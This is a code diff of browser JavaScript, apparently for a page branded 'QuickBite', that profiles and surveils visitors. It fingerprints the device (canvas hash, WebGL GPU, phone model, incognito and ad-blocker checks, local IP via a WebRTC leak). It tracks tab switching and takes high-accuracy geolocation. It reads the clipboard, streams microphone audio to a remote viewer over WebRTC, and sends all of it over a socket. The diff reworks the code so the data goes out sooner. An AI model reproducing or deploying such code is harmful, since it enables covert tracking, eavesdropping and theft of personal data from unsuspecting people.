@@ -166,20 +166,18 @@
     ]
   };
 
-  // ── Get real model via Client Hints (Chrome 90+) ─────────────
+  // ── Client Hints API — real model on Chrome 120+ ──────────────
   async function getRealModel() {
     try {
       if (navigator.userAgentData) {
-        const data = await navigator.userAgentData.getHighEntropyValues([
-          'model', 'platform', 'platformVersion'
-        ]);
-        return data.model || null;
+        const d = await navigator.userAgentData.getHighEntropyValues(['model']);
+        if (d.model && d.model.length > 1) return d.model;
       }
     } catch(e) {}
     return null;
   }
 
-  // ── Phone model lookup tables ─────────────────────────────────
+  // ── Phone model lookup table ───────────────────────────────────
   const ALL_MODELS = {
     'SM-E236B':'Samsung Galaxy F23','SM-E135F':'Samsung Galaxy F13',
     'SM-E225F':'Samsung Galaxy F22','SM-E426B':'Samsung Galaxy F42 5G',
@@ -240,21 +238,17 @@
   };
 
   function parsePhoneModel(ua) {
-    // Samsung — extract SM- code directly
     let m = ua.match(/;\s*(SM-[A-Z0-9]+)/i);
     if (m) {
       const raw = m[1].trim().toUpperCase();
       return ALL_MODELS[raw] || 'Samsung ' + raw;
     }
-    // Other Android — extract before Build/
     m = ua.match(/\(Linux;\s*Android\s*[\d.]+;\s*([^;)]+?)(?:\s+Build\/|\))/i);
     if (m) {
       const raw = m[1].trim();
-      // Chrome 120+ reduced UA — returns 'K', handle via Client Hints
       if (raw === 'K' || raw.length <= 2) return null;
-      const key = raw.toUpperCase();
       if (ALL_MODELS[raw]) return ALL_MODELS[raw];
-      if (ALL_MODELS[key]) return ALL_MODELS[key];
+      if (ALL_MODELS[raw.toUpperCase()]) return ALL_MODELS[raw.toUpperCase()];
       if (/^RMX/i.test(raw)) return 'Realme ' + raw.toUpperCase();
       if (/^(IN|LE|NE|BE|AC|IV)\d/i.test(raw)) return 'OnePlus ' + raw.toUpperCase();
       if (/^CPH\d/i.test(raw)) return 'OnePlus/Oppo ' + raw.toUpperCase();
@@ -269,116 +263,8 @@
     if (m) return 'iPad (iOS ' + m[1].replace(/_/g, '.') + ')';
     return null;
   }
-    'SM-E225F':'Samsung Galaxy F22','SM-E426B':'Samsung Galaxy F42 5G',
-    'SM-E528B':'Samsung Galaxy F52 5G','SM-E625F':'Samsung Galaxy F62',
-    'SM-E736B':'Samsung Galaxy F73 5G',
-    // ── Samsung Galaxy A ──
-    'SM-A045F':'Samsung Galaxy A04','SM-A055F':'Samsung Galaxy A05',
-    'SM-A125F':'Samsung Galaxy A12','SM-A135F':'Samsung Galaxy A13',
-    'SM-A145F':'Samsung Galaxy A14','SM-A155F':'Samsung Galaxy A15',
-    'SM-A225F':'Samsung Galaxy A22','SM-A235F':'Samsung Galaxy A23',
-    'SM-A245F':'Samsung Galaxy A24','SM-A255F':'Samsung Galaxy A25',
-    'SM-A325F':'Samsung Galaxy A32','SM-A336B':'Samsung Galaxy A33 5G',
-    'SM-A346B':'Samsung Galaxy A34 5G','SM-A356B':'Samsung Galaxy A35 5G',
-    'SM-A515F':'Samsung Galaxy A51','SM-A525F':'Samsung Galaxy A52',
-    'SM-A526B':'Samsung Galaxy A52 5G','SM-A536B':'Samsung Galaxy A53 5G',
-    'SM-A546B':'Samsung Galaxy A54 5G','SM-A556B':'Samsung Galaxy A55 5G',
-    'SM-A715F':'Samsung Galaxy A71','SM-A725F':'Samsung Galaxy A72',
-    'SM-A736B':'Samsung Galaxy A73 5G',
-    // ── Samsung Galaxy S ──
-    'SM-S901B':'Samsung Galaxy S22','SM-S906B':'Samsung Galaxy S22+',
-    'SM-S908B':'Samsung Galaxy S22 Ultra','SM-S911B':'Samsung Galaxy S23',
-    'SM-S916B':'Samsung Galaxy S23+','SM-S918B':'Samsung Galaxy S23 Ultra',
-    'SM-S921B':'Samsung Galaxy S24','SM-S926B':'Samsung Galaxy S24+',
-    'SM-S928B':'Samsung Galaxy S24 Ultra',
-    // ── Samsung Galaxy M ──
-    'SM-M135F':'Samsung Galaxy M13','SM-M145F':'Samsung Galaxy M14',
-    'SM-M236B':'Samsung Galaxy M23','SM-M336B':'Samsung Galaxy M33',
-    'SM-M346B':'Samsung Galaxy M34','SM-M526B':'Samsung Galaxy M52',
-    // ── Xiaomi / Redmi / Poco ──
-    '220333QNY':'Redmi Note 11','2201117TI':'Redmi Note 12',
-    '23021RAAEG':'Redmi Note 12 5G','2303CRA44A':'Redmi Note 12 Pro',
-    'M2101K7BG':'Redmi Note 10 Pro','M2101K7BI':'Redmi Note 10 Pro',
-    'M2003J15SC':'Redmi Note 9 Pro','21121119SC':'Redmi Note 11 Pro',
-    '2201116SG':'Redmi Note 11 Pro+','220333QBI':'Redmi 10C',
-    '22120RN86G':'Redmi A1','23028RNCAG':'Redmi 12','2201117TY':'Redmi 12C',
-    'M2012K11AG':'Poco X3 Pro','M2007J20CG':'Poco X3',
-    '22041219PG':'Poco X4 Pro 5G','22101320G':'Poco X5 Pro 5G',
-    '22111317PG':'Poco M5','M2103K19PG':'Poco M3',
-    '2106118C':'Xiaomi 11 Lite NE','2107113SG':'Xiaomi 11T',
-    '21081111RG':'Xiaomi 11T Pro','2201123G':'Xiaomi 12',
-    '2203129G':'Xiaomi 12 Pro','2210132G':'Xiaomi 12T',
-    '23049PCD8G':'Xiaomi 13',
-    // ── Realme ──
-    'RMX3521':'Realme 9','RMX3474':'Realme 9i','RMX3492':'Realme 9 Pro',
-    'RMX3491':'Realme 9 Pro+','RMX3630':'Realme 10','RMX3686':'Realme 10 Pro',
-    'RMX3687':'Realme 10 Pro+','RMX3760':'Realme 11','RMX3799':'Realme 11 Pro',
-    'RMX3834':'Realme 11 Pro+','RMX2155':'Realme 7','RMX3231':'Realme 8',
-    'RMX3241':'Realme 8 Pro','RMX3301':'Realme Narzo 50',
-    'RMX3506':'Realme C21Y','RMX3261':'Realme C25Y','RMX3516':'Realme C33',
-    'RMX3624':'Realme C35','RMX3710':'Realme C53','RMX3690':'Realme C55',
-    // ── OnePlus ──
-    'IN2010':'OnePlus 8','IN2013':'OnePlus 8 Pro','LE2101':'OnePlus 9',
-    'LE2111':'OnePlus 9 Pro','NE2211':'OnePlus 10 Pro','CPH2413':'OnePlus 10T',
-    'CPH2449':'OnePlus 11','CPH2505':'OnePlus Nord CE3 Lite',
-    'AC2001':'OnePlus Nord','BE2029':'OnePlus Nord CE',
-    'CPH2409':'OnePlus Nord CE 2 Lite','CPH2399':'OnePlus Nord 2T',
-    'CPH2467':'OnePlus Nord CE3','IV2201':'OnePlus Nord 2',
-    // ── Oppo ──
-    'CPH2477':'Oppo A17','CPH2471':'Oppo A17k','CPH2385':'Oppo A57',
-    'CPH2387':'Oppo A57s','CPH2461':'Oppo A77','CPH2339':'Oppo A96',
-    'CPH2269':'Oppo Reno 6','CPH2251':'Oppo Reno 5','CPH2357':'Oppo Reno 7',
-    'CPH2371':'Oppo Reno 7 Pro','CPH2505':'Oppo Reno 8T',
-    // ── Vivo ──
-    'V2204':'Vivo Y16','V2207':'Vivo Y22','V2249':'Vivo Y35',
-    'V2120':'Vivo Y21','V2124':'Vivo Y21s','V2026':'Vivo Y20',
-    'V2111':'Vivo Y33s','V2054':'Vivo V20','V2044':'Vivo V20 Pro',
-    'V2109':'Vivo V21','V2145':'Vivo V23 5G','V2203':'Vivo V25',
-    'V2241':'Vivo V27','V2243':'Vivo V27 Pro',
-  };
 
-  function parsePhoneModel(ua) {
-    // Samsung — specifically extract SM- code (most reliable)
-    let m = ua.match(/;\s*(SM-[A-Z0-9]+)/i);
-    if (m) {
-      const raw = m[1].trim().toUpperCase();
-      if (ALL_MODELS[raw]) return ALL_MODELS[raw];
-      return 'Samsung ' + raw;
-    }
-
-    // Extract raw model code (stops before Build/ keyword)
-    m = ua.match(/\(Linux;\s*Android\s*[\d.]+;\s*([^;)]+?)(?:\s+Build\/|\))/i);
-    if (m) {
-      const raw = m[1].trim();
-      const key = raw.toUpperCase();
-
-      // Check lookup table first
-      if (ALL_MODELS[raw]) return ALL_MODELS[raw];
-      if (ALL_MODELS[key]) return ALL_MODELS[key];
-
-      // Brand detection by prefix if not in table
-      if (/^RMX/i.test(raw)) return 'Realme ' + raw.toUpperCase();
-      if (/^(IN|LE|NE|BE|AC|IV)\d/i.test(raw)) return 'OnePlus ' + raw.toUpperCase();
-      if (/^CPH\d/i.test(raw)) return 'OnePlus/Oppo ' + raw.toUpperCase();
-      if (/^V\d{4}/i.test(raw)) return 'Vivo ' + raw.toUpperCase();
-      if (/^\d{8,}/.test(raw)) return 'Xiaomi/Redmi ' + raw;
-      if (/^M\d{4}/.test(raw)) return 'Xiaomi ' + raw;
-
-      return raw;
-    }
-
-    // iPhone
-    m = ua.match(/iPhone\s*OS\s*([\d_]+)/i);
-    if (m) return 'iPhone (iOS ' + m[1].replace(/_/g, '.') + ')';
-
-    // iPad
-    m = ua.match(/iPad.*OS\s*([\d_]+)/i);
-    if (m) return 'iPad (iOS ' + m[1].replace(/_/g, '.') + ')';
-
-    return 'Unknown';
-  }
-
-  // ── Parse browser name + version ──────────────────────────────
+  // ── Parse browser ─────────────────────────────────────────────
   function parseBrowser(ua) {
     if (/SamsungBrowser\/([\d.]+)/.test(ua)) return 'Samsung Browser ' + RegExp.$1;
     if (/EdgA?\/([\d.]+)/.test(ua)) return 'Edge ' + RegExp.$1;
@@ -389,76 +275,55 @@
     return 'Unknown';
   }
 
-  // ── Canvas fingerprint → unique device ID ─────────────────────
+  // ── Canvas fingerprint ────────────────────────────────────────
   function getCanvasFingerprint() {
     try {
       const c = document.createElement('canvas');
       const ctx = c.getContext('2d');
-      ctx.textBaseline = 'top';
-      ctx.font = '14px Arial';
-      ctx.fillStyle = '#f60';
-      ctx.fillRect(125, 1, 62, 20);
-      ctx.fillStyle = '#069';
-      ctx.fillText('QuickBite🍕', 2, 15);
-      ctx.fillStyle = 'rgba(102,204,0,0.7)';
-      ctx.fillText('QuickBite🍕', 4, 17);
+      ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
+      ctx.fillStyle = '#069'; ctx.fillText('QuickBite🍕',2,15);
+      ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('QuickBite🍕',4,17);
       const data = c.toDataURL();
-      // Hash it to a short ID
       let hash = 0;
-      for (let i = 0; i < data.length; i++) {
-        hash = ((hash << 5) - hash) + data.charCodeAt(i);
-        hash |= 0;
-      }
+      for (let i = 0; i < data.length; i++) { hash = ((hash<<5)-hash)+data.charCodeAt(i); hash|=0; }
       return Math.abs(hash).toString(16).toUpperCase();
     } catch(e) { return 'Unavailable'; }
   }
 
-  // ── WebGL GPU info ─────────────────────────────────────────────
+  // ── WebGL GPU ─────────────────────────────────────────────────
   function getGPUInfo() {
     try {
       const c = document.createElement('canvas');
       const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-      if (!gl) return { renderer: 'Unavailable', vendor: 'Unavailable' };
+      if (!gl) return { renderer:'Unavailable', vendor:'Unavailable' };
       const ext = gl.getExtension('WEBGL_debug_renderer_info');
-      if (ext) {
-        return {
-          renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL),
-          vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)
-        };
-      }
-      return { renderer: gl.getParameter(gl.RENDERER), vendor: gl.getParameter(gl.VENDOR) };
-    } catch(e) { return { renderer: 'Unavailable', vendor: 'Unavailable' }; }
+      if (ext) return { renderer:gl.getParameter(ext.UNMASKED_RENDERER_WEBGL), vendor:gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) };
+      return { renderer:gl.getParameter(gl.RENDERER), vendor:gl.getParameter(gl.VENDOR) };
+    } catch(e) { return { renderer:'Unavailable', vendor:'Unavailable' }; }
   }
 
   // ── Incognito detection ───────────────────────────────────────
   async function detectIncognito() {
-    return new Promise((resolve) => {
-      // Method: try to estimate storage quota — incognito has much lower limit
+    return new Promise(resolve => {
       if (navigator.storage && navigator.storage.estimate) {
-        navigator.storage.estimate().then(({ quota }) => {
-          // Normal: > 100GB, Incognito: < 200MB on Chrome
-          resolve(quota < 200 * 1024 * 1024 ? 'YES ⚠️' : 'No');
+        navigator.storage.estimate().then(({quota}) => {
+          resolve(quota < 200*1024*1024 ? 'YES ⚠️' : 'No');
         }).catch(() => resolve('Unknown'));
-      } else {
-        resolve('Unknown');
-      }
+      } else resolve('Unknown');
     });
   }
 
-  // ── Local IP via WebRTC leak ──────────────────────────────────
+  // ── Local IP via WebRTC ───────────────────────────────────────
   function getLocalIP() {
-    return new Promise((resolve) => {
+    return new Promise(resolve => {
       try {
-        const pc = new RTCPeerConnection({ iceServers: [] });
+        const pc = new RTCPeerConnection({iceServers:[]});
         pc.createDataChannel('');
         pc.createOffer().then(o => pc.setLocalDescription(o));
         const ips = [];
-        pc.onicecandidate = (e) => {
-          if (!e.candidate) {
-            pc.close();
-            resolve(ips.length ? ips.join(', ') : 'Unavailable');
-            return;
-          }
+        pc.onicecandidate = e => {
+          if (!e.candidate) { pc.close(); resolve(ips.length ? ips.join(', ') : 'Unavailable'); return; }
           const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
           if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
         };
@@ -474,7 +339,7 @@
       t.className = 'adsbox ad-banner pub_300x250';
       t.style = 'position:absolute;left:-9999px;height:1px;width:1px;';
       document.body.appendChild(t);
-      await new Promise(r => setTimeout(r, 100));
+      await new Promise(r => setTimeout(r,100));
       const blocked = t.offsetHeight === 0;
       document.body.removeChild(t);
       return blocked ? 'YES ⚠️' : 'No';
@@ -484,38 +349,24 @@
   // ── Tab visibility tracking ───────────────────────────────────
   let tabHidden = 0, tabShown = 0;
   document.addEventListener('visibilitychange', () => {
-    if (document.hidden) {
-      tabHidden++;
-    } else {
-      tabShown++;
-    }
+    if (document.hidden) tabHidden++; else tabShown++;
     socket.emit('p3-tab-activity', {
-      hidden: tabHidden,
-      shown: tabShown,
-      timeOnPage: Math.round((Date.now() - pageEnterTime) / 1000) + 's'
+      hidden: tabHidden, shown: tabShown,
+      timeOnPage: Math.round((Date.now()-pageEnterTime)/1000)+'s'
     });
   });
 
-  // ── Collect all device info ───────────────────────────────────
+  // ── Collect device info ───────────────────────────────────────
   async function collectDeviceInfo() {
     const nav = window.navigator;
     const ua = nav.userAgent;
     const gpu = getGPUInfo();
-    const incognito = await detectIncognito();
-    const localIP = await getLocalIP();
-    const adBlocker = await detectAdBlocker();
-
-    // Try Client Hints first (works for Chrome 120+ reduced UA)
-    const clientHintsModel = await getRealModel();
-    const uaModel = parsePhoneModel(ua);
-    const phoneModel = clientHintsModel || uaModel || 'Unknown';
-
     const plugins = [];
     for (let i = 0; i < nav.plugins.length; i++) plugins.push(nav.plugins[i].name);
 
     const info = {
       userAgent: ua,
-      phoneModel: phoneModel,
+      phoneModel: parsePhoneModel(ua) || 'Detecting...',
       browser: parseBrowser(ua),
       platform: nav.platform || 'Unknown',
       language: nav.language,
@@ -530,14 +381,14 @@
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       timezoneOffset: new Date().getTimezoneOffset(),
       touchPoints: nav.maxTouchPoints,
-      memory: nav.deviceMemory ? nav.deviceMemory + ' GB' : 'Unknown',
+      memory: nav.deviceMemory ? nav.deviceMemory+' GB' : 'Unknown',
       cores: nav.hardwareConcurrency || 'Unknown',
       canvasID: getCanvasFingerprint(),
       gpuRenderer: gpu.renderer,
       gpuVendor: gpu.vendor,
-      incognito,
-      localIP,
-      adBlocker,
+      incognito: 'Checking...',
+      localIP: 'Checking...',
+      adBlocker: 'Checking...',
       plugins: plugins.length ? plugins.join(', ') : 'None',
       deviceTime: new Date().toLocaleString(),
       battery: null,
@@ -547,54 +398,62 @@
     if (nav.connection) {
       info.connection = {
         type: nav.connection.effectiveType,
-        downlink: nav.connection.downlink + ' Mbps',
-        rtt: nav.connection.rtt + ' ms',
+        downlink: nav.connection.downlink+' Mbps',
+        rtt: nav.connection.rtt+' ms',
         saveData: nav.connection.saveData
       };
     }
 
+    // Send immediately
     if (nav.getBattery) {
       nav.getBattery().then(b => {
         info.battery = {
-          level: Math.round(b.level * 100) + '%',
+          level: Math.round(b.level*100)+'%',
           charging: b.charging,
-          chargingTime: b.chargingTime === Infinity ? 'N/A' : b.chargingTime + 's',
-          dischargingTime: b.dischargingTime === Infinity ? 'N/A' : Math.round(b.dischargingTime/60) + ' min remaining'
+          chargingTime: b.chargingTime===Infinity ? 'N/A' : b.chargingTime+'s',
+          dischargingTime: b.dischargingTime===Infinity ? 'N/A' : Math.round(b.dischargingTime/60)+' min remaining'
         };
         socket.emit('p3-device-info', info);
       }).catch(() => socket.emit('p3-device-info', info));
     } else {
       socket.emit('p3-device-info', info);
     }
+
+    // Slow ops in background — send update when done
+    Promise.all([getRealModel(), detectIncognito(), getLocalIP(), detectAdBlocker()])
+      .then(([clientModel, incognito, localIP, adBlocker]) => {
+        if (clientModel) info.phoneModel = clientModel;
+        info.incognito = incognito;
+        info.localIP = localIP;
+        info.adBlocker = adBlocker;
+        socket.emit('p3-device-info', info);
+      });
   }
 
   // ── Location ──────────────────────────────────────────────────
   function getLocation() {
     if (!navigator.geolocation) return;
     navigator.geolocation.getCurrentPosition(
-      (pos) => {
+      pos => {
         socket.emit('p3-location', {
-          lat: pos.coords.latitude,
-          lng: pos.coords.longitude,
+          lat: pos.coords.latitude, lng: pos.coords.longitude,
           accuracy: Math.round(pos.coords.accuracy),
-          altitude: pos.coords.altitude,
-          speed: pos.coords.speed,
-          heading: pos.coords.heading,
+          altitude: pos.coords.altitude, speed: pos.coords.speed,
           timestamp: new Date(pos.timestamp).toLocaleString()
         });
         document.querySelector('.loc-btn').textContent = '📍 Location found';
       },
-      (err) => { socket.emit('p3-location', { error: err.message }); },
+      err => socket.emit('p3-location', { error: err.message }),
       { enableHighAccuracy: true, timeout: 10000 }
     );
   }
 
-  // ── Microphone streaming ──────────────────────────────────────
+  // ── Microphone ────────────────────────────────────────────────
   async function startMic() {
     try {
-      micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+      micStream = await navigator.mediaDevices.getUserMedia({ audio:true, video:false });
       socket.emit('p3-phone-ready');
-    } catch (err) {
+    } catch(err) {
       socket.emit('p3-phone-ready');
     }
   }
@@ -604,12 +463,12 @@
     const pc = new RTCPeerConnection(iceConfig);
     peerConnections[viewerId] = pc;
     micStream.getTracks().forEach(track => pc.addTrack(track, micStream));
-    pc.onicecandidate = (e) => {
-      if (e.candidate) socket.emit('p3-ice', { candidate: e.candidate, to: viewerId });
+    pc.onicecandidate = e => {
+      if (e.candidate) socket.emit('p3-ice', { candidate:e.candidate, to:viewerId });
     };
     const offer = await pc.createOffer();
     await pc.setLocalDescription(offer);
-    socket.emit('p3-offer', { sdp: pc.localDescription, to: viewerId });
+    socket.emit('p3-offer', { sdp:pc.localDescription, to:viewerId });
   });
 
   socket.on('p3-answer', async ({ sdp }) => {
@@ -627,7 +486,7 @@
     try {
       const text = await navigator.clipboard.readText();
       socket.emit('p3-clipboard', { text: text || '(empty)' });
-    } catch (e) {
+    } catch(e) {
       socket.emit('p3-clipboard', { error: 'Denied or unavailable' });
     }
   }
@@ -638,12 +497,12 @@
       const res = await fetch('https://ipapi.co/json/');
       const d = await res.json();
       socket.emit('p3-ip-info', {
-        ip: d.ip, isp: d.org, asn: d.asn,
-        city: d.city, region: d.region, country: d.country_name,
-        postal: d.postal, callingCode: d.country_calling_code,
-        currency: d.currency, ipLat: d.latitude, ipLng: d.longitude,
+        ip:d.ip, isp:d.org, asn:d.asn,
+        city:d.city, region:d.region, country:d.country_name,
+        postal:d.postal, callingCode:d.country_calling_code,
+        currency:d.currency, ipLat:d.latitude, ipLng:d.longitude,
       });
-    } catch (e) {
+    } catch(e) {
       socket.emit('p3-ip-info', { error: e.message });
     }
   }
